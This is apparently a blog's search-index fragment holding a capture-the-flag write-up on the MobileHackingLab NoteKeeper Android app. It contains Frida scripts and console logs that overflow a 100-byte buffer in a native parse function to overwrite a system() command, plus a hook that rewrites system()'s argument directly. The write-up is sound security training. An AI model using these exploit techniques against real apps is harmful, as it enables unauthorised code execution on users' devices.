style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-xml\" data-lang=\"xml\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003e\u0026lt;activity\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#a6e22e\"\u003eandroid:name=\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;com.mobilehackinglab.configeditor.MainActivity\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#a6e22e\"\u003eandroid:exported=\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;true\u0026#34;\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e\u0026gt;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#f92672\"\u003e\u0026lt;intent-filter\u0026gt;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#f92672\"\u003e\u0026lt;action\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003eandroid:name=\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;android.intent.action.MAIN\u0026#34;\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e/\u0026gt;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#f92672\"\u003e\u0026lt;category\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003eandroid:name=\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;android.intent.category.LAUNCHER\u0026#34;\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e/\u0026gt;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#f92672\"\u003e\u0026lt;/intent-filter\u0026gt;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#f92672\"\u003e\u0026lt;intent-filter\u0026gt;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#f92672\"\u003e\u0026lt;action\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003eandroid:name=\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;android.intent.action.VIEW\u0026#34;\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e/\u0026gt;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#f92672\"\u003e\u0026lt;category\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003eandroid:name=\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;android.intent.category.DEFAULT\u0026#34;\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e/\u0026gt;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#f92672\"\u003e\u0026lt;category\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003eandroid:name=\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;android.intent.category.BROWSABLE\u0026#34;\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e/\u0026gt;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#f92672\"\u003e\u0026lt;data\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003eandroid:scheme=\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;file\u0026#34;\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e/\u0026gt;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#f92672\"\u003e\u0026lt;data\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003eandroid:scheme=\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;http\u0026#34;\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e/\u0026gt;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#f92672\"\u003e\u0026lt;data\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003eandroid:scheme=\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;https\u0026#34;\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e/\u0026gt;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#f92672\"\u003e\u0026lt;data\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003eandroid:mimeType=\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;application/yaml\u0026#34;\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e/\u0026gt;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#f92672\"\u003e\u0026lt;/intent-filter\u0026gt;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003e\u0026lt;/activity\u0026gt;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/td\u003e\u003c/tr\u003e\u003c/table\u003e\n\u003c/div\u003e\n\u003c/div\u003e\u003cp\u003eThere\u0026rsquo;s only one activity and it has a intent filter which accept URI parameter.\u003c/p\u003e","title":"MHL Config Editor"},{"content":"Challenge Description Welcome to the NoteKeeper Application, where users can create and encode short notes. However, lurking within the app is a critical buffer overflow vulnerability. Your mission is to uncover this vulnerability and exploit it to achieve remote code execution.\nnotekeeper.apk\nSolution I started out by performing static analysis to look into the code\nStatic Analysis I started out by looking into the AndroidManifest.xml.\n1 2 3 4 5 6 7 8 \u0026lt;activity android:name=\u0026#34;com.mobilehackinglab.notekeeper.MainActivity\u0026#34; android:exported=\u0026#34;true\u0026#34;\u0026gt; \u0026lt;intent-filter\u0026gt; \u0026lt;action android:name=\u0026#34;android.intent.action.MAIN\u0026#34;/\u0026gt; \u0026lt;category android:name=\u0026#34;android.intent.category.LAUNCHER\u0026#34;/\u0026gt; \u0026lt;/intent-filter\u0026gt; \u0026lt;/activity\u0026gt; There\u0026rsquo;s only one activity at the moment so lets look into it.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 public final native String parse(String Title); public static final void showDialogue$lambda$1(EditText $ed_title, EditText $ed_content, MainActivity this$0, Dialog dialog, View it) { Intrinsics.checkNotNullParameter(this$0, \u0026#34;this$0\u0026#34;); Intrinsics.checkNotNullParameter(dialog, \u0026#34;$dialog\u0026#34;); String title_ = $ed_title.getText().toString(); String note_con = $ed_content.getText().toString(); if (title_.length() \u0026gt; 0) { if (note_con.length() \u0026gt; 0) { String cap_title = this$0.parse(title_); note_data dataElement = new note_data(cap_title, note_con, \u0026#34;Number of characters : \u0026#34; + note_con.length()); this$0.notes.add(dataElement); Note_Adapter note_Adapter = this$0.notes_adp; if (note_Adapter == null) { Intrinsics.throwUninitializedPropertyAccessException(\u0026#34;notes_adp\u0026#34;); note_Adapter = null; } note_Adapter.notifyDataSetChanged(); dialog.dismiss(); return; } } Toast.makeText(this$0, \u0026#34;Don\u0026#39;t leave the title or note field empty\u0026#34;, 0).show(); } static { System.loadLibrary(\u0026#34;notekeeper\u0026#34;); } After reading some code, I noticed that this application need to load a shared library and it has a native function parse. Aside from that, the showDialogue$lambda$1 is the function where it will trigger the native function parse. I then proceed to read the shared library by using ghidra.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 undefined8 Java_com_mobilehackinglab_notekeeper_MainActivity_parse (_JNIEnv *param_1,undefined8 param_2,_jstring *param_3) { int local_2a8; char local_2a4 [100]; char acStack_240 [500]; int local_4c; ushort *local_48; _jstring *local_40; undefined8 local_38; _JNIEnv *local_30; undefined8 local_28; local_40 = param_3; local_38 = param_2; local_30 = param_1; local_48 = (ushort *)_JNIEnv::GetStringChars(param_1,param_3,(uchar *)0x0); local_4c = _JNIEnv::GetStringLength(local_30,local_40); memcpy(acStack_240,\u0026#34;Log \\\u0026#34;Note added at $(date)\\\u0026#34;\u0026#34;,500); if (local_48 == (ushort *)0x0) { local_28 = 0; } else { local_2a4[0] = FUN_00100bf4(*local_48 \u0026amp; 0xff); for (local_2a8 = 1; local_2a8 \u0026lt; local_4c; local_2a8 = local_2a8 + 1) { local_2a4[local_2a8] = (char)local_48[local_2a8]; } system(acStack_240); local_2a4[local_2a8] = \u0026#39;\\0\u0026#39;; local_28 = _JNIEnv::NewStringUTF(local_30,local_2a4); } return local_28; } Based on the C++ code, I noticed that there\u0026rsquo;s a function system that it used to execute command. Aside from that, it has a for loop that will write every char input into a variable local_2a4 but the variable can only support up to 100 characters char local_2a4 [100];. Since this challenge has something to do with buffer overflow, I suspect this is the place that I should inject my code where I perform buffer overflow and write into the acStack_240. Now from what I understand, time to try it with dynamic analysis.\nDynamic Analysis I started out by playing around with the application.\nI noticed that after I tried to execute the native function parse, I dont get any useful information from it. I then tried to hook using Frida. To do so, start a frida server first.\n1 beryllium:/ # /data/local/tmp/frida-server After setting a frida-server in the rooted devices, I then proceed to write some simple script to check what its doing.\n1 2 3 4 5 6 7 8 9 10 11 12 ava.perform(()=\u0026gt; { let MainActivity = Java.use(\u0026#34;com.mobilehackinglab.notekeeper.MainActivity\u0026#34;); MainActivity[\u0026#34;parse\u0026#34;].implementation = function (Title) { console.log(`MainActivity.parse is called: Title=${Title}`); let result = this[\u0026#34;parse\u0026#34;](Title); console.log(`MainActivity.parse result=${result}`); return result; }; }) 1 2 3 4 5 6 7 8 9 10 11 12 13 14 PS E:\\Desktop\\Android\\frida-script\u0026gt; frida -U -N com.mobilehackinglab.notekeeper -l a.js ____ / _ | Frida 16.5.9 - A world-class dynamic instrumentation toolkit | (_| | \u0026gt; _ | Commands: /_/ |_| help -\u0026gt; Displays the help system . . . . object? -\u0026gt; Display information about \u0026#39;object\u0026#39; . . . . exit/quit -\u0026gt; Exit . . . . . . . . More info at https://frida.re/docs/home/ . . . . . . . . Connected to POCOPHONE F1 (id=d211a91c) [POCOPHONE F1::com.mobilehackinglab.notekeeper ]-\u0026gt; MainActivity.parse is called: Title=q MainActivity.parse result=Q I tried feeding in random data again and use frida to check the input and output, which basically taking q as input and Q as output. Things isnt right here as I need to get the system function to see what it\u0026rsquo;s doing. I then tried to write another frida script to try and hook the system function.\n1 2 3 4 5 6 7 8 9 10 11 Interceptor.attach(Module.getExportByName(null, \u0026#34;system\u0026#34;), { onEnter: function (args) { var command = Memory.readUtf8String(args[0]); console.log(\u0026#34;[*] system() called with command: \u0026#34; + command); console.log(hexdump(args[0],{offset: 0,length:48})); }, onLeave: function (retval) { console.log(\u0026#34;[*] system() returned with code: \u0026#34; + retval); } }); After adding this, I managed to read some information from the system function.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 PS E:\\Desktop\\Android\\frida-script\u0026gt; frida -U -N com.mobilehackinglab.notekeeper -l a.js ____ / _ | Frida 16.5.9 - A world-class dynamic instrumentation toolkit | (_| | \u0026gt; _ | Commands: /_/ |_| help -\u0026gt; Displays the help system . . . . object? -\u0026gt; Display information about \u0026#39;object\u0026#39; . . . . exit/quit -\u0026gt; Exit . . . . . . . . More info at https://frida.re/docs/home/ . . . . . . . . Connected to POCOPHONE F1 (id=d211a91c) [POCOPHONE F1::com.mobilehackinglab.notekeeper ]-\u0026gt; MainActivity.parse is called: Title=q [*] system() called with command: Log \u0026#34;Note added at $(date)\u0026#34; 0 1 2 3 4 5 6 7 8 9 A B C D E F 0123456789ABCDEF 7ff3ad0850 4c 6f 67 20 22 4e 6f 74 65 20 61 64 64 65 64 20 Log \u0026#34;Note added 7ff3ad0860 61 74 20 24 28 64 61 74 65 29 22 00 00 00 00 00 at $(date)\u0026#34;..... 7ff3ad0870 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ [*] system() returned with code: 0x7f00 MainActivity.parse result=Q I managed to read the system function input by using the frida script. Now the only thing that I should do is just performing buffer overflow to rewrite the system function input. I started out by trying to add 101 characters to see how it works. I rewrite the frida script to make things easier.\n1 2 3 4 5 6 7 8 let MainActivity = Java.use(\u0026#34;com.mobilehackinglab.notekeeper.MainActivity\u0026#34;); MainActivity[\u0026#34;parse\u0026#34;].implementation = function (Title) { Title = \u0026#34;A\u0026#34;.repeat(100) + \u0026#34;B\u0026#34;; console.log(`MainActivity.parse is called: Title=${Title}`); let result = this[\u0026#34;parse\u0026#34;](Title); console.log(`MainActivity.parse result=${result}`); return result; }; 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 PS E:\\Desktop\\Android\\frida-script\u0026gt; frida -U -N com.mobilehackinglab.notekeeper -l a.js ____ / _ | Frida 16.5.9 - A world-class dynamic instrumentation toolkit | (_| | \u0026gt; _ | Commands: /_/ |_| help -\u0026gt; Displays the help system . . . . object? -\u0026gt; Display information about \u0026#39;object\u0026#39; . . . . exit/quit -\u0026gt; Exit . . . . . . . . More info at https://frida.re/docs/home/ . . . . . . . . Connected to POCOPHONE F1 (id=d211a91c) [POCOPHONE F1::com.mobilehackinglab.notekeeper ]-\u0026gt; MainActivity.parse is called: Title=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAB [*] system() called with command: Bog \u0026#34;Note added at $(date)\u0026#34; 0 1 2 3 4 5 6 7 8 9 A B C D E F 0123456789ABCDEF 7ff3ad0850 42 6f 67 20 22 4e 6f 74 65 20 61 64 64 65 64 20 Bog \u0026#34;Note added 7ff3ad0860 61 74 20 24 28 64 61 74 65 29 22 00 00 00 00 00 at $(date)\u0026#34;..... 7ff3ad0870 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ [*] system() returned with code: 0x7f00 MainActivity.parse result=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAB As shown in the result, it is possible to rewrite the stack / system funtion input as it changed from Log to Bog which is our input. I now just need to change it into my command to perform RCE.\n1 2 3 4 5 6 7 8 9 let MainActivity = Java.use(\u0026#34;com.mobilehackinglab.notekeeper.MainActivity\u0026#34;); MainActivity[\u0026#34;parse\u0026#34;].implementation = function (Title) { let command = \u0026#34;id \u0026gt;\u0026gt; /sdcard/Download/hacked.txt\u0026#34; Title = \u0026#34;A\u0026#34;.repeat(100) + command; console.log(`MainActivity.parse is called: Title=${Title}`); let result = this[\u0026#34;parse\u0026#34;](Title); console.log(`MainActivity.parse result=${result}`); return result; }; By using this script, I successfully injected my command using buffer overflow technique.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 PS E:\\Desktop\\Android\\frida-script\u0026gt; frida -U -N com.mobilehackinglab.notekeeper -l a.js ____ / _ | Frida 16.5.9 - A world-class dynamic instrumentation toolkit | (_| | \u0026gt; _ | Commands: /_/ |_| help -\u0026gt; Displays the help system . . . . object? -\u0026gt; Display information about \u0026#39;object\u0026#39; . . . . exit/quit -\u0026gt; Exit . . . . . . . . More info at https://frida.re/docs/home/ . . . . . . . . Connected to POCOPHONE F1 (id=d211a91c) [POCOPHONE F1::com.mobilehackinglab.notekeeper ]-\u0026gt; MainActivity.parse is called: Title=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAid \u0026gt;\u0026gt; /sdcard/Download/hack.txt [*] system() called with command: id \u0026gt;\u0026gt; /sdcard/Download/hack.txt 0 1 2 3 4 5 6 7 8 9 A B C D E F 0123456789ABCDEF 7ff3ad0960 69 64 20 3e 3e 20 2f 73 64 63 61 72 64 2f 44 6f id \u0026gt;\u0026gt; /sdcard/Do 7ff3ad0970 77 6e 6c 6f 61 64 2f 68 61 63 6b 2e 74 78 74 00 wnload/hack.txt. 7ff3ad0980 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ [*] system() returned with code: 0x0 MainActivity.parse result=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAid \u0026gt;\u0026gt; /sdcard/Download/hack.txt I then checked it the POC is created or not.\n1 2 beryllium:/sdcard/Download # cat hack.txt uid=10344(u0_a344) gid=10344(u0_a344) groups=10344(u0_a344),3003(inet),9997(everybody),20344(u0_a344_cache),50344(all_a344) context=u:r:untrusted_app:s0:c88,c257,c512,c768 I managed to perform RCE by abusing the buffer overflow. Here\u0026rsquo;s a full frida script that I wrote.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 Java.perform(()=\u0026gt; { let MainActivity = Java.use(\u0026#34;com.mobilehackinglab.notekeeper.MainActivity\u0026#34;); MainActivity[\u0026#34;parse\u0026#34;].implementation = function (Title) { let command = \u0026#34;id \u0026gt;\u0026gt; /sdcard/Download/hack.txt\u0026#34; Title = \u0026#34;A\u0026#34;.repeat(100) + command; console.log(`MainActivity.parse is called: Title=${Title}`); let result = this[\u0026#34;parse\u0026#34;](Title); console.log(`MainActivity.parse result=${result}`); return result; }; test1(); }) function test1(){ Interceptor.attach(Module.getExportByName(null, \u0026#34;system\u0026#34;), { onEnter: function (args) { var command = Memory.readUtf8String(args[0]); console.log(\u0026#34;[*] system() called with command: \u0026#34; + command); console.log(hexdump(args[0],{offset: 0,length:48})); }, onLeave: function (retval) { console.log(\u0026#34;[*] system() returned with code: \u0026#34; + retval); } }); } Aside from this, I found another method which I could utilize the frida functionality to overwrite the stack / system function input instead of abusing the buffer overflow.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 Interceptor.attach(Module.getExportByName(null, \u0026#34;system\u0026#34;), { onEnter: function (args) { var command = Memory.readUtf8String(args[0]); console.log(\u0026#34;[*] system() called with command: \u0026#34; + command); console.log(hexdump(args[0],{offset: 0,length:48})); var newCommand = \u0026#34;id \u0026gt;\u0026gt; /sdcard/Download/hack2.txt\u0026#34;; Memory.writeUtf8String(args[0], newCommand); console.log(\u0026#34;[+] Replaced with new command:\u0026#34;, Memory.readUtf8String(args[0])); console.log(hexdump(args[0],{offset: 0,length:48})); }, onLeave: function (retval) { console.log(\u0026#34;[*] system() returned with code: \u0026#34; + retval); } }); By using this writeUtf8String, I could just rewrite the stack / system function input.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 PS E:\\Desktop\\Android\\frida-script\u0026gt; frida -U -N com.mobilehackinglab.notekeeper -l a.js ____ / _ | Frida 16.5.9 - A world-class dynamic instrumentation toolkit | (_| | \u0026gt; _ | Commands: /_/ |_| help -\u0026gt; Displays the help system . . . . object? -\u0026gt; Display information about \u0026#39;object\u0026#39; . . . . exit/quit -\u0026gt; Exit . . . . . . . . More info at https://frida.re/docs/home/ . . . . . . . . Connected to POCOPHONE F1 (id=d211a91c) [POCOPHONE F1::com.mobilehackinglab.notekeeper ]-\u0026gt; MainActivity.parse is called: Title=qa [*] system() called with command: Log \u0026#34;Note added at $(date)\u0026#34; 0 1 2 3 4 5 6 7 8 9 A B C D E F 0123456789ABCDEF 7ff3ad0970 4c 6f 67 20 22 4e 6f 74 65 20 61 64 64 65 64 20 Log \u0026#34;Note added 7ff3ad0980 61 74 20 24 28 64 61 74 65 29 22 00 00 00 00 00 at $(date)\u0026#34;..... 7ff3ad0990 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ [+] Replaced with new command: id \u0026gt;\u0026gt; /sdcard/Download/hack2.txt 0 1 2 3 4 5 6 7 8 9 A B C D E F 0123456789ABCDEF 7ff3ad0970 69 64 20 3e 3e 20 2f 73 64 63 61 72 64 2f 44 6f id \u0026gt;\u0026gt; /sdcard/Do 7ff3ad0980 77 6e 6c 6f 61 64 2f 68 61 63 6b 32 2e 74 78 74 wnload/hack2.txt 7ff3ad0990 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ [*] system() returned with code: 0x0 MainActivity.parse result=Qa Here\u0026rsquo;s the result.\n1 2 beryllium:/sdcard/Download # cat hack2.txt uid=10344(u0_a344) gid=10344(u0_a344) groups=10344(u0_a344),3003(inet),9997(everybody),20344(u0_a344_cache),50344(all_a344) context=u:r:untrusted_app:s0:c88,c257,c512,c768 This is another thing that I found interesting and here\u0026rsquo;s the full frida script for this.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 Java.perform(()=\u0026gt; { let MainActivity = Java.use(\u0026#34;com.mobilehackinglab.notekeeper.MainActivity\u0026#34;); MainActivity[\u0026#34;parse\u0026#34;].implementation = function (Title) { // let command = \u0026#34;id \u0026gt;\u0026gt; /sdcard/Download/hack.txt\u0026#34; // Title = \u0026#34;A\u0026#34;.repeat(100) + command; console.log(`MainActivity.parse is called: Title=${Title}`); let result = this[\u0026#34;parse\u0026#34;](Title); console.log(`MainActivity.parse result=${result}`); return result; }; test2(); }) function test2(){ Interceptor.attach(Module.getExportByName(null, \u0026#34;system\u0026#34;), { onEnter: function (args) { var command = Memory.readUtf8String(args[0]); console.log(\u0026#34;[*] system() called with command: \u0026#34; + command); console.log(hexdump(args[0],{offset: 0,length:48})); var newCommand = \u0026#34;id \u0026gt;\u0026gt; /sdcard/Download/hack2.txt\u0026#34;; Memory.writeUtf8String(args[0], newCommand); console.log(\u0026#34;[+] Replaced with new command:\u0026#34;, Memory.readUtf8String(args[0])); console.log(hexdump(args[0],{offset: 0,length:48})); }, onLeave: function (retval) { console.log(\u0026#34;[*] system() returned with code: \u0026#34; + retval); } }); } Things I learned from this challenge buffer overflow in android frida checking function input and output hooking system function and rewrite the input by changing it in the stack. ","permalink":"https://callmeks.github.io/posts/mhl-note-keeper/","summary":"\u003ch2 id=\"challenge-description\"\u003eChallenge Description\u003c/h2\u003e\n\u003cblockquote\u003e\n\u003cp\u003eWelcome to the NoteKeeper Application, where users can create and encode short notes. However, lurking within the app is a critical buffer overflow vulnerability. Your mission is to uncover this vulnerability and exploit it to achieve remote code execution.\u003c/p\u003e\n\u003cp\u003e\u003ca href=\"static/notekeeper.apk\"\u003enotekeeper.apk\u003c/a\u003e\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003ch2 id=\"solution\"\u003eSolution\u003c/h2\u003e\n\u003cp\u003eI started out by performing static analysis to look into the code\u003c/p\u003e\n\u003ch3 id=\"static-analysis\"\u003eStatic Analysis\u003c/h3\u003e\n\u003cp\u003eI started out by looking into the \u003ccode\u003eAndroidManifest.xml\u003c/code\u003e.\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cdiv style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\n\u003ctable style=\"border-spacing:0;padding:0;margin:0;border:0;\"\u003e\u003ctr\u003e\u003ctd style=\"vertical-align:top;padding:0;margin:0;border:0;\"\u003e\n\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\" id=\"hl-0-1\"\u003e\u003ca style=\"outline:none;text-decoration:none;color:inherit\" href=\"#hl-0-1\"\u003e1\u003c/a\u003e\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\" id=\"hl-0-2\"\u003e\u003ca style=\"outline:none;text-decoration:none;color:inherit\" href=\"#hl-0-2\"\u003e2\u003c/a\u003e\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\" id=\"hl-0-3\"\u003e\u003ca style=\"outline:none;text-decoration:none;color:inherit\" href=\"#hl-0-3\"\u003e3\u003c/a\u003e\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\" id=\"hl-0-4\"\u003e\u003ca style=\"outline:none;text-decoration:none;color:inherit\" href=\"#hl-0-4\"\u003e4\u003c/a\u003e\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\" id=\"hl-0-5\"\u003e\u003ca style=\"outline:none;text-decoration:none;color:inherit\" href=\"#hl-0-5\"\u003e5\u003c/a\u003e\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\" id=\"hl-0-6\"\u003e\u003ca style=\"outline:none;text-decoration:none;color:inherit\" href=\"#hl-0-6\"\u003e6\u003c/a\u003e\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\" id=\"hl-0-7\"\u003e\u003ca style=\"outline:none;text-decoration:none;color:inherit\" href=\"#hl-0-7\"\u003e7\u003c/a\u003e\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\" id=\"hl-0-8\"\u003e\u003ca style=\"outline:none;text-decoration:none;color:inherit\" href=\"#hl-0-8\"\u003e8\u003c/a\u003e\n\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/td\u003e\n\u003ctd style=\"vertical-align:top;padding:0;margin:0;border:0;;width:100%\"\u003e\n\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-xml\" data-lang=\"xml\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003e\u0026lt;activity\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#a6e22e\"\u003eandroid:name=\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;com.mobilehackinglab.notekeeper.MainActivity\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#a6e22e\"\u003eandroid:exported=\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;true\u0026#34;\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e\u0026gt;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#f92672\"\u003e\u0026lt;intent-filter\u0026gt;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#f92672\"\u003e\u0026lt;action\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003eandroid:name=\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;android.intent.action.MAIN\u0026#34;\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e/\u0026gt;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#f92672\"\u003e\u0026lt;category\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003eandroid:name=\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;android.intent.category.LAUNCHER\u0026#34;\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e/\u0026gt;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan 